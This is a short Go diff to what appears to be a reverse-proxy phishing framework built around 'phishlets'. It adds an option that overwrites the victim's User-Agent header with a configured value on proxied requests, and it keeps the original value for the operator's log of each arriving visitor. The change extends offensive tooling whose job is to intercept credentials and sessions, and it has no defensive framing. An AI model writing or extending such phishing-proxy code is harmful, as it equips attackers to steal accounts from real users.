@@ -179,6 +179,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// inject custom user-agent if set
+			plet := p.getPhishletByPhishHost(req.Host)
+			originalUA := req.Header.Get("User-Agent")
+			if plet != nil {
+				customUA, ok := p.cfg.GetSiteCustomUa(plet.Name)
+				if ok && customUA != "" {
+					req.Header.Set("User-Agent", customUA)
+					log.Debug("Injected custom User-Agent for phishlet '%s': %s", plet.Name, customUA)
+				}
+			}
+
 			if p.cfg.GetBlacklistMode() != "off" {
 				if p.bl.IsBlacklisted(from_ip) {
 					if p.bl.IsVerbose() {
@@ -397,7 +408,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									sid := p.last_sid
 									p.last_sid += 1
-									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), originalUA, remote_addr)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
